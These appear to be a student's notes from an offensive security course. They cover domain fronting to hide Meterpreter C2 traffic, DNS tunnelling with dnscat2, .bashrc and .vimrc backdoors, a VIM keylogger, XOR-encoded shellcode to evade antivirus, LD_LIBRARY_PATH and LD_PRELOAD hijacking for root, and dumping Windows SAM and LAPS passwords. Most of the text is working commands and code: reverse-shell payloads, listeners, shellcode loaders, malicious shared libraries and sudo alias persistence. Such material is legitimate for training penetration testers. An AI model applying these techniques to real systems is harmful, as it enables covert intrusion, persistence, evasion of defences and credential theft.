E.g., A CDN network that is caching content for `good.com`. This endpoint has a domain name of `cdn1111.someprovider.com`.

We'll create a CDN endpoint that is proxying or caching content to `malicious.com`. This new endpoint will have a domain name of `cdn2222.someprovider.com`, which means if we browse to this address, we eventually access `malicious.com`.

Assuming that `malicious.com` is a blocked domain and `good.com` is an allowed domain, we could then subversively access `malicious.com`.

1. The client initiates a DNS request to its primary DNS server to look up the IP of `good.com`.
2. The primary DNS server asks the root DNS server for the IP address of `good.com`.
3. The server replies with the configured **CNAME record** for that domain, which is `cdn1111.someprovider.com`.
4. The primary DNS server queries the `someprovider.com` DNS server for the `cdn1111.someprovider.com` domain.
5. The DNS server for `someprovider.com` replies with 192.168.1.1, which is the IP of the CDN endpoint.
6. The primary DNS sends the reply to the client.
7. The client initiates a TLS session to domain `good.com` to the CDN endpoint.
8. The CDN endpoint serves the certificate for `good.com`.
9. The client asks for the `cdn2222.someprovider.com` resource.
10. The CDN endpoint serves the contents of `malicious.com`.

If we are using HTTPS and no inspection devices are present, this primarily appears to be a connection to `good.com` because of the initial DNS request and the SNI entry from the TLS Client Hello.

Even in an environment that uses HTTPS filtering, we can use this technique to **bypass DNS filters**.

Some CDN providers, like Google and Amazon, will **block requests if the host in the SNI and the Host headers don't match** => Microsoft Azure.

### Domain Fronting with Azure CDN

Host a Meterpreter listener on our `meterpreter.info` domain.

Set up a CDN in Azure to proxy requests to this domain

* Resource group: The CDN profile must belong to a resource group. We can either select an existing one or create a new one. E.g., offsecdomainfront-rg
* RG location: An arbitrary geographic area where we want to host the CDN.
* Pricing tier: select "Standard Verizon". This affects not only the pricing, but also the features we will have access to, and will also affect the way the CDN works. The "Standard Microsoft" tier creates issues with TLS and the caching is also not as flexible.
* CDN endpoint name: The hostname we will use in the HTTP header to access `meterpreter.info`. This can be anything that is available from Azure, e.g., `offensive-security` and the **suffix** will be `azureedge.net`.
* Origin type: This should be set to "Custom origin".
* Origin hostname: This would be the actual website that should be cached by CDN under normal cases. This is the domain where we host our C2 server `meterpreter.info`

Caching will break our C2 channel, especially our reverse shells since they are not static and each request returns a unique response.

To disable caching, select our Endpoint and **Caching rules** > set **Caching behavior** to "Bypass cache", which will disable caching.

Also set **Query string caching behavior** to "Bypass caching for query strings", which will prevent the CDN from caching any requests containing query strings.

On our machine, which is the destination for `meterpreter.info`, set up a simple Python HTTP and HTTPS listener to test web server functionality

```bash
python3 -m http.server 80
```

`python3 httpsserver.py`

```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import socketserver

httpd = socketserver.TCPServer(('138.68.99.177', 443), SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket, 
        keyfile="key.pem", 
        certfile='cert.pem', server_side=True)

httpd.serve_forever()
```

```bash
curl http://offensive-security.azureedge.net
curl -k https://offensive-security.azureedge.net
```

```bash
git clone https://github.com/rvrsh3ll/FindFrontableDomains
cd FindFrontableDomains/
sudo ./setup.sh
```

Find a frontable domain

```bash
python3 FindFrontableDomains.py --domain outlook.com
```

The output reveals `assets.outlook.com`, is frontable.

Test the viability of the domain

```bash
curl --header "Host: offensive-security.azureedge.net" http://assets.outlook.com
```

This returns a blank response because the CDN used by the `assets.outlook.com` domain is in a **different region or pricing tier**.

```bash
python3 FindFrontableDomains.py --domain skype.com
```

Test the viability of the domain `do.skype.com`

```bash
curl --header "Host: offensive-security.azureedge.net" http://do.skype.com
curl --header "Host: offensive-security.azureedge.net" https://do.skype.com
```

Meterpreter agent

```bash
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe
```

Meterpreter listener

```
use exploit/multi/handler
set LHOST do.skype.com
set OverrideLHOST do.skype.com
set OverrideRequestHost true
set HttpHostHeader offensive-security.azureedge.net
run -j
```

If our target environment is not using HTTPS inspection, our HTTPS traffic will not only be hidden but it will appear to be directed to `do.skype.com`. Since many organizations use Skype for meetings, this traffic will be considered legitimate. This allows us to bypass domain, proxy, and IDS filters in one shot.

Censys is a search engine similar to Shodan, searching Internet-connected devices based on their fingerprint information, like webserver type, certificate details, etc. Use this service to find Azure domain-frontable sites.

### Domain Fronting in the Lab

Use the trusted `good.com` domain to reach the otherwise blocked `bad.com` domain. Our CDN hostname will be `cdn123.offseccdn.com`, which will point to the IP address of `bad.com`.

Windows > Ubuntu (Snort IPS v2.9.7 + dnsmasq (DNS) + NGINX web server) > Internet (Kali)

#### On Windows machine:

DNS Server of the Windows machine is the Ubuntu machine

#### On Ubuntu machine:

`/etc/hosts`
```
<Ubuntu IP>     good.com
<Kali IP>       bad.com
<Ubuntu IP>     cdn123.offseccdn.com
```

```bash
sudo systemctl restart dnsmasq
sudo systemctl restart nginx
```

NGINX server is serving content for `good.com`, which is a safe domain, the traffic destined for it will be allowed through.

`/etc/nginx/sites-available/good.com`
```
server {
  listen 443 ssl;
  server_name good.com;
  ssl_certificate     good.crt;
  ssl_certificate_key good.key;
  location / {
            root /var/www/good.com;
  }
}
```

The `bad.com` domain is blocked by Snort, which will drop all DNS queries using this snort rule (`/etc/snort/rules/local.rules`):

`drop udp any any -> any 53 (msg:"VIRUS DNS query for malicious bad.com domain"; content:"|01|"; offset:2; depth:1; content:"|00 01 00 00 00 00 00|"; distance:1; within:7; content:"|03|bad|03|com"; fast_pattern; classtype:bad-unknown; sid:2013482; rev:4;)`

`cdn123.offseccdn.com` represents a CDN endpoint that is serving content for `bad.com`.

To represent a CDN network, we configured NGINX as a **reverse proxy** for this domain so it forwards all requests to the `bad.com` domain.

The configuration file related to this domain `/etc/nginx/sites-available/cdn123.offseccdn.com`:

```
server {
  listen 443 ssl;
  server_name cdn123.offseccdn.com;
  ssl_certificate     cdn.crt;
  ssl_certificate_key cdn.key;

  location / {
         proxy_pass https://bad.com
         proxy_ssl_verify off;
   }
}
```

Since we are using self-signed certificates, we also need to set **proxy_ssl_verify** to "off".

Connect to the trusted `good.com` domain and use the `cdn123.offseccdn.com` domain in the HTTP Host header to access the domain `bad.com`. As both of these domains are served from the same machine (Ubuntu), the request will be forwarded to our Kali machine.

#### On Kali machine:

Ccreate our reverse HTTPS Meterpreter shell, where we set `good.com` as the LHOST and `cdn123.offseccdn.com` as the HttpHostHeader.

```bash
msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
```

Configure a listener to handle this shell. Note that we will use a **stageless** payload, so we don't need to configure the **OverrideLHOST** and **OverrideRequestHost** options.

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_https;set HttpHostHeader cdn123.offseccdn.com; set LHOST good.com;set LPORT 443;run;"
```

## DNS Tunneling

In order to receive the DNS requests generated by the client, we need to register our DNS server as the **authoritative server** for a given target domain, i.e. to assign an **NS record** to our domain.

=> We must purchase a domain and under its configuration, and set the **NS record** to our DNS tunnel server. This will cause the DNS server to forward all subdomain requests to our server.

From the **client**, we can encapsulate data into the name field, which contains the domain name. However, since the top-level domain is fixed, we can only encapsulate data as **subdomains**. These can be up to **63 characters long** but the total length of a domain can't exceed 253 characters.

From the **server** side, we can return data in a variety of fields based on the record type that was requested. An "A" record can only contain IPv4 addresses, => only store 4 bytes of information, but "TXT" records allow up to 64k.

Clients will continuously poll the server for new commands because the server can't initiate connections to the client. The client will execute new commands and send the results via new query messages. Within these exchanges, we will generally **hex-encode** our data, which allows us to transfer custom data.

E.g., Client polls the server via DNS TXT queries

`Query: Request TXT record for "61726574686572656e6577636f6d6d616e6473.ourdomain.com"`

represents the hex-encoded string of "aretherenewcommands".
* If there is nothing to run, the server will return an empty TXT record.
* If there are commands to execute, the server will return the hex-encoded string of the command to be executed by the client.

E.g., The "hostname" command: `TXT: "686f73746e616d65"`

Next, the client executes the command and captures the results. To send the results, it will generate a new DNS lookup that includes the output of the requested command. In this case, the response would include the hex-encoded hostname ("client") in the request. E.g., "636c69656e74.ourdomain.com" The client could safely use a single "A" record lookup in this case due to the short response. If the response was longer, the client would use multiple DNS queries.

Proper tunneling tools account for various issues such as **DNS retransmission**, in which the client resends queries because it didn't receive an answer in time, or **DNS caching**, in which the client caches the result of DNS queries. Full-featured tools can potentially tunnel arbitrary TCP/IP traffic and can also encrypt data.

### DNS Tunneling with dnscat2

Windows > Ubuntu > Kali

#### On Ubuntu machine:

Ubuntu machine will act as the **primary DNS server**. All subdomain lookup requests for a specific domain should go to our DNS tunneling server (our Kali machine), which acts as the authoritative name server for that domain.

We'll use a simple dnsmasq DNS server and configure it to forward requests. We'll use `tunnel.com` as an example domain.

Edit the `/etc/dnsmasq.conf` file on the Ubuntu machine 

```
server=/tunnel.com/<Kali IP>
server=/somedomain.com/<Kali IP>
```

```bash
sudo systemctl restart dnsmasq
```

#### On Kali machine:

```bash
sudo apt install dnscat2

dnscat2-server tunnel.com
```

#### On Windows machine:

```bat
dnscat2-v0.07-client-win32.exe tunnel.com
```

On Kali machine:

```
dnscat2> session -i 1
command (client) 1> shell
command (client) 1> session -i 2
cmd.exe (client) 2> whoami
Ctrl + Z
```

Redirecting our local port 3389 to the Windows machine's IP

```
command (client) 1> listen 127.0.0.1:3389 172.16.51.21:3389
```

# Linux Post-Exploitation

## User Configuration Files

`.bash_profile` is executed when logging in to the system initially, via a serial console or SSH.

`.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.

=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system to maintain persistence, escalate privileges

```bash
echo "touch /tmp/bashtest.txt" >> ~/.bashrc
```

### VIM Config Simple Backdoor

To print a message to the user, use this command in the `.vimrc` file or within the editor:

`:echo "this is a test"`

Since VIM has access to the shell environment's variables, we can use **$USER** to get the username or **$UID** to get the user's ID number.

The commands specified in the `.vimrc` file are executed when VIM is launched. => cause a user's VIM session to **perform unintended actions on their behalf** when VIM is run.

To run **shell commands** from within the config file:

`!touch /tmp/test.txt`

By default, VIM allows shell commands but some hardened environments have VIM configured to restrict them. (e.g., calling VIM with the `-Z` parameter on the command line)

Putting our commands directly into the user's `.vimrc` file isn't stealthy, as a user modifying their own settings may accidentally discover the changes.

=> "Source" a shell script using the bash `source` command. This loads a specified shell script and runs it.

"Import" other VIM configuration files into the user's current config with the `:source` command.

Note: Source call for loading a VIM configuration file is prepended with a **colon** and not an **exclamation point**, which is used for shell commands.

**VIM plugin directory**: All VIM config files (have a `.vim` extension) located in the user's `~/.vim/plugin` directory will be loaded when VIM is run.

The `:silent` command mutes any debug output:

`.vimrc` file

`:silent !source ~/.vimrunscript`


`/home/offsec/.vimrunscript` file

```bash
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
```

We can gain root privileges if the user runs VIM as **root** or uses the `visudo` command

VIM handles its configuration files differently for a user **in a sudo context** depending on the distribution of Linux:

* On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file.

* On a Debian: VIM will use the root user's VIM configuration.

=> add an alias to the user's `.bashrc` file

`alias sudo="sudo -E"`

If we want the alias changes to go into effect right away:

```bash
source ~/.bashrc
```

In some cases, users are given limited sudo rights to run only specific programs.

```bash
sudo -l
```

`(root) NOPASSWD: /usr/bin/vim /opt/important.conf`

This limited access can be set in the `/etc/sudoers` file with the same syntax. In this case, a password is not required for sudo access.

Run VIM and then enter `:shell` to gain a root shell automatically. If a password was required, use the alias vector to gain root access with our backdoor script.

Note: Many administrators now require the use of `sudoedit` for modifying sensitive files. This process makes copies of the files for the user to edit and then uses `sudo` to overwrite the old files. It also prevents the editor itself from running as sudo.

### VIM Config Simple Keylogger

Create a keylogger to log any changes a user makes to a file => capturing sensitive data in configuration files or scripts.

**autocommand** settings do not require the shell (even if the current system uses a restricted VIM environment that blocks any shell commands).

Use `:autocmd` in a VIM configuration file or in the editor to set actions for a collection of predefined events.

E.g., VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and **BufWritePost** (after writing a change buffer to a file).

Perform our actions based on the **BufWritePost** event. This activates once a buffer has already been written to the intended file.

VIM supports the use of basic if statements in its configuration scripts.

```
:if <some condition>
:<some command>
:else
:<some alternative command>
:endif
```

With environment variables, check whether the user is running as **root**.

The "*" specifies that this action will be performed for all files being edited.
=> could change this to match only files with a particular name or file extension.

Then use `:w!` to save the buffer contents.

`/home/offsec/.vim/plugin/settings.vim`.

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

It's also possible to run shell commands on an autocommand trigger. Just replace everything after "`:silent`" with "`!`" followed by a shell script name or shell command.


## Bypassing AV

Turn Kaspersky off 

```bash
sudo kesl-control --stop-t 1
```

Decrypts the encrypted version of the EICAR file 

```bash
sudo gpg -d eicar.txt.gpg > eicar.txt
```

Run a scan on our EICAR test file

```bash
sudo kesl-control --scan-file ./eicar.txt
```

Query Kaspersky's event log

```bash
sudo kesl-control -E --query | grep DetectName
```

A 64-bit Meterpreter payload encoded with the `x64/zutto_dekiru` encoder is not detected by the AV.

Restore real-time protection 

```bash
sudo kesl-control --start-t 1
```

Generate a 64-bit unencoded shellcode with msfvenom, which will act as a wrapper to load and run the shellcode.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
```

`hack.c`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9";

int main (int argc, char **argv) 
{
    // Run our shellcode
    int (*ret)() = (int(*)())buf;
    ret();
}
```

Meterpreter listener

```bash
msfconsole -qx "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST 192.168.119.120;set LPORT 1337;run;"
```

```bash
gcc -o hack.out hack.c -z execstack
./hack.out
```

Create an encoder program to perform an XOR operation on our payload string to produce the new obfuscated version.

`encoder.c`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
unsigned char buf[] = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31...";

int main (int argc, char **argv) 
{
    char xor_key = 'J';
    int payload_length = (int) sizeof(buf);

    for (int i=0; i<payload_length; i++)
    {
        printf("\\x%02X",buf[i]^xor_key);
    }

    return 0;
}
```

```bash
gcc -o encoder.out encoder.c
./encoder.out 
```

`hack2.c`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our obfuscated shellcode
unsigned char buf[] = "\x20\x73\x12\x45\x4F\x02\xCF\x8A...";

int main (int argc, char **argv) 
{
    char xor_key = 'J';
    int arraysize = (int) sizeof(buf);
    for (int i=0; i<arraysize-1; i++)
    {
        buf[i] = buf[i]^xor_key;
    }
    int (*ret)() = (int(*)())buf;
    ret();
}
```

```bash
gcc -o hack2.out hack2.c -z execstack
./hack2.out
```

## Shared Libraries

When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order. When it finds a copy of the library it needs, it stops searching and loads the module it finds:

1. Directories listed in the application's **RPATH** value.
2. Directories specified in the **LD_LIBRARY_PATH** environment variable.
3. Directories listed in the application's RUNPATH value.
4. Directories specified in `/etc/ld.so.conf`.
5. System library directories: `/lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64`, and potentially others.

### Shared Library Hijacking via LD_LIBRARY_PATH

After checking its internal **RPATH** values for hard coded paths, it then checks for an environment variable called **LD_LIBRARY_PATH**.

Intended use cases include **testing new library versions** without modifying existing libraries or modifying the program's behavior temporarily for debugging purposes.

=> Exploit a victim user's application by creating a malicious library and then use **LD_LIBRARY_PATH** to hijack the application's normal flow and execute our malicious code to escalate privileges.

For demo, we are explicitly setting the environment variable before each call. However, an attacker would insert a line in the user's `.bashrc` or `.bash_profile` to define the **LD_LIBRARY_PATH** variable so it is set automatically when the user logs in.

One difficulty is that on most modern systems, user environment variables are not passed on when using `sudo`. This setting is configured in the `/etc/sudoers` file by using the **env_reset** keyword as a default.

Some systems are configured to allow a user's environment to be passed on to sudo. These will have **env_keep** set instead.

Bypass the **env_reset** setting with our `.bashrc` alias for the sudo command. 

`alias sudo="sudo -E"`

As a normal user, it's not typically possible to read `/etc/sudoers` to know if env_reset is set, so it may be useful to create this alias setting regardless.

A simple malicious shared library

`hax.c`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```

**Constructor functions** are run when the library is first initialized in order to set up code for the library to use.

We initially set the user's UID and GID to "0", which will make the user root if run in a sudo context.

Compile our shared library

```bash
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -o libhax.so hax.o
```

* -Wall: gives more verbose warnings when compiling.
* -fPIC: use position independent code,  suitable for shared libraries since they are loaded in unpredictable memory locations.
* -c: compile but not link the code
* -shared: create a shared library from our object file.

Shared libraries in Linux naming convention may also include a version number appended to the end.

E.g., `lib<libraryname>.so.1`

To hijack the library of a program that a victim is likely to run, especially as sudo.

=> `top` command. User might run this as sudo in order to display processes with elevated permissions.

Ideally, target a library that also allows the program to run correctly even after our exploit is run, but this may not always be possible.

Give information on which libraries are being loaded when `top` is being run.

```bash
ldd /usr/bin/top
```

```
libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
```

A library for error reporting called `LibGPG-Error` is likely to be loaded by the application but not likely to be called unless the program encounters an error => shouldn't prevent normal use of the application.

```bash
export LD_LIBRARY_PATH=/home/offsec/ldlib/
cp libhax.so /home/offsec/ldlib/libgpg-error.so.0
```

To later turn off the malicious library functionality, unset the environment variable using the `unset` command.

```bash
top
```

Our exploit fails miserably

```
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
```

We're missing the symbol **gpgrt_lock_lock** with a version of **GPG_ERROR_1.0**.

When loading a library, a program only wants to know that our library contains symbols of that name. It doesn't care anything about validating their type or use.

* -s: give a list of available symbols in the library.
Not all of the listed symbols are needed since some of them refer to other libraries. The symbol it's looking for is tagged with GPG_ERROR_1.0.

* --wide: force it to include the untruncated names of the symbols, as well as the full path to the original shared library file.

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

```
int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
int gpgrt_fflush;
int gpgrt_poll;
```

Error message about the shared **library's version information** => **libgcrypt** does require version information in associated libraries (Not all supporting libraries require version information).

=> A map file that identifies particular symbols as being associated with a given version of the library.

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

```
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
...
```

Wrap a list of symbols into a symbol map file

`gpg.map`

```
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
...
gpgrt_fflush;
gpgrt_poll;

};
```

`hax.c`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...

void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```

```bash
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o /home/offsec/ldlib/libgpg-error.so.0 hax.o

export LD_LIBRARY_PATH=/home/offsec/ldlib/
top
```

In modern Linux distributions, a user's environment variables aren't normally passed to a sudo context.

=> Create an alias for sudo in the user's `.bashrc` file replacing `sudo` with `sudo -E`. However, **some environment variables are not passed even with this approach**. E.g., LD_LIBRARY_PATH.

Modify the alias to include our **LD_LIBRARY_PATH** variable explicitly `.bashrc`

`alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"`

Source the `.bashrc` file to load the changes we made

```bash
source ~/.bashrc
```

```bash
sudo top
```

### Exploitation via LD_PRELOAD

**LD_PRELOAD** is an environment variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library before any others.

=> Functions defined in this library are used before any with the **same method signature** that are defined in other libraries. => **function hooking**

A **method signature** is the information that a program needs to define a method. It consists of the value type the method will return, the method name, a listing of the parameters it needs, and each of their data types.

Sudo will explicitly **ignore** the **LD_PRELOAD** environment variable for a user unless the user's real UID is the same as their effective UID.

Find an application that the victim is likely to frequently use (with sudo) => `cp` utility 

Run `ltrace` to get a list of library function calls it uses during normal operation (`ltrace` is not installed by default on all Linux distributions.)

```bash
ltrace cp
```

```
strrchr("cp", '/')          = nil
...
geteuid()                   = 1000
...
fclose(0x7f717f0c0680)      = 0
+++ exited (status 1) +++
```

In a real-world scenario, it is ideal to run this on the target machine if possible to ensure that the library calls correctly match the target's system and program configuration.

`geteuid` function is a good candidate because it seems to only be called once during the application run, which limits how frequently our code will be executed.

=> limit redundant shells.

It takes no parameters and returns the user's UID number.

`dlfcn.h` defines functions for interacting with the dynamic linking loader.

`evileuid.c`

```C
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
char buf[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6...";

uid_t geteuid(void)
{
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if (fork() == 0)
        {
            intptr_t pagesize = sysconf(_SC_PAGESIZE);
            if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                 pagesize, PROT_READ|PROT_EXEC)) {
                    perror("mprotect");
                    return -1;
                }
            int (*ret)() = (int(*)())buf;
            ret();
        }
        else
        {
            printf("HACK: returning from function...\n");
            return (*old_geteuid)();
        }
        printf("HACK: Returning from main...\n");
        return -2;
}
```

Use the `dlsym` function to get the memory address of the original version of the `geteuid` function. It will skip our version of the function and find the next one, which should be the original version loaded by the program the user called.

If we use it as-is, when we run our target application, it will stop and wait for our shell to return before continuing. => The `cp` program will stall => raise suspicion.

Ideally, we want the program to return right away, but still run our shell in the background.

=> Create a new process for our shell by using the `fork` method, which creates a new process by duplicating the parent process.

If the result of the fork call is zero, we are running inside the newly created child process, and can run our shell. Otherwise, it will return the expected value of geteuid to the original calling program so it can continue as intended.

The final 2 lines provide a meaningless return value in case the code reaches that point, which realistically should never happen.
       
The code within the fork branch checks that the shellcode resides on an executable memory page before executing it.

`-f PIC` compilation flag relocates our shellcode to the library `.data` section in order to make it position independent. Specifically, the code gets the size of a memory page so it knows how much memory to access.

It then changes the page of memory that contains our shellcode and makes it executable using **mprotect**. + setting its access properties to **PROT_READ** and **PROT_EXEC**, which makes our code readable and executable.

```bash
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

```bash
export LD_PRELOAD=/home/offsec/evil_geteuid.so
cp /etc/passwd /tmp/testpasswd
```

To elevate our privileges

The dynamic linker ignores LD_PRELOAD when the user's effective UID (EUID) does not match its real UID, e.g., when running commands as sudo.

We might be lucky and have `env_keep+=LD_PRELOAD` set in `/etc/sudoers`, but it's not likely. The env_keep setting specifically allows certain environment variables to be passed into the sudo session when calls are made. By default this is turned off.

To explicitly set LD_PRELOAD when calling sudo in `.bashrc`.

`alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"`

```bash
sudo cp /etc/passwd /tmp/testpasswd
```

# Linux Lateral Movement

# Windows Credentials

## SAM Database

Local Windows credentials are stored in the Security Account Manager (SAM) database as password hashes using the NTLM hashing format, which is based on the MD4 algorithm.

We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine.

The built-in default-named Administrator account is installed on all Windows-based machines.

This account has been disabled on desktop editions since Windows Vista, but it is enabled on servers by default. To ease administrative tasks, system administrators often enable this default account on desktop editions and set a single shared password.

Every Windows account has a unique Security Identifier (SID):

`S-R-I-S`

The SID begins with a literal "S" to identify the string as a SID, followed by a revision level (usually set to "1"), an identifier-authority value (often "5") and one or more subauthority values.

The subauthority will always end with a Relative Identifier (RID) representing a specific object on the machine.

The **local administrator account** is sometimes referred to as **RID 500** due to its static RID value of 500.

Determine the local computername from the associated environment variable and use it with the WMI Win32_UserAccount class.

```pwsh
$env:computername
```

Locate the SID of the local administrator account 

```pwsh
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
```

The SAM is located at `C:\Windows\System32\config\SAM`, but the SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from an administrative command prompt.

```bat
copy c:\Windows\System32\config\sam C:\Users\offsec.corp1\Downloads\sam
```

It is possible to perform a physical attack as well by booting the computer off an external media like a USB into a Linux-based operating system and accessing the content of the hard drive.

2 potential workarounds.

1. Use the Volume Shadow Copy Server, which can create a snapshot (or "shadow volume") of the local hard drive with `vssadmin`, which is installed on Windows 8.1 and later. We can create a new shadow volume with the `create shadow` option, but this option is only available on server editions of the tool.

2. (Will work on our Windows 10 machine) Execute this from an administrative command prompt to create a snapshot of the C drive.

```bat
wmic shadowcopy call create Volume='C:\'
```

To verify this, we'll run vssadmin and list the existing shadow volumes with list shadows:

```bat
vssadmin list shadows
```

Copy the SAM database from it

```bat
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
```

The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM database. However, it is also locked by the SYSTEM account.

```bat
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
```

We can also obtain a copy of the SAM database and SYSTEM files from the registry in the `HKLM\sam` and `HKLM\system` hives, respectively. Administrative permissions are required to read and copy.

```bat
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```

2 tools that can decrypt these files are Mimikatz and Creddump7

```bash
sudo apt install python-crypto
git clone https://github.com/CiscoCXSecurity/creddump7

source Github/creddump7/creddump7-venv/bin/activate
python2 pwdump.py system sam
```

## Hardening the Local Administrator Account

To prevent attacks that leverage shared Administrator passwords, Microsoft introduced **Group Policy Preferences**, which included the ability to **centrally change local administrator account passwords**.

However, this approach stored data in an XML file in a **SYSVOL** folder, which must be accessible to all computers in Active Directory. => obvious security issue since the unhashed local administrator password was stored on an easily-accessible share.

To solve this issue, Microsoft AES-256 encrypted them:

```xml
<?xml version="1.0" encoding="utf-8" ?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D224D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2015-05-22 05:01:55" uid="{D5FE7352-81E1-42A2-B7DA-118402BE4C33}">
		<Properties action="U" newName="ADSAdmin" fullName="" description"" cpassword="RI133B2WI2CiIOCau1DtrtTe3wdFwzCiWB5PSAxXMDstchJt3bLOUie0BaZ/7rdQjuqTonF3ZWAKa1iRvd4JGQ" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)" expires="2015-05-21" />
	</User>
</Groups>
```

The AES-256 encrypted password is realistically unbreakable given a strong key. Surprisingly, Microsoft published the AES private key on MSDN, effectively breaking their own encryption.

The `Get-GPPPassword` PowerShell script could effectively locate and decrypt any passwords found in affected systems' SYSVOL folder.

Microsoft issued a security update, which removed the ability to create Group Policy Preferences containing passwords.

Although these files could no longer be created, existing Group Policy Preferences containing passwords were not removed => some may still exist in the wild.

Microsoft released the **Local Administrator Password Solution (LAPS)**, which offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers.

LAPS introduces 2 new attributes for the computer object into Active Directory. 

1. **ms-mcs-AdmPwdExpirationTime**, which registers the expiration time of a password as directed through a group policy.

2. **ms-mcs-AdmPwd**, which contains the clear text password of the local administrator account.

LAPS uses `admpwd.dll` to change the local administrator password and push the new password to the **ms-mcs-AdmPwd** attribute of the associated computer object.

If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory as part of a penetration test.

Use the **LAPSToolkit** PowerShell script

List all computers that are set up with LAPS and display the hostname, the clear text password, and the expiration time:

```pwsh
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

Our current user account does not have permissions to read the password, so it is returned as empty.

Discover groups that can fully enumerate the LAPS data:

```pwsh
Find-LAPSDelegatedGroups
```

Enumerate members of that group with PowerView

```pwsh
Get-NetGroupMember -GroupName "LAPS Password Readers"
```

These permissions are often given to both help desk employees and system administrators.

```pwsh
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

## Access Token

As penetration testers, 2 concepts relating to the access token: integrity levels and privileges.

Windows defines 4 integrity levels, which determine the level of access: low, medium, high, and system.

- Low integrity is used with sandbox processes like web browsers.

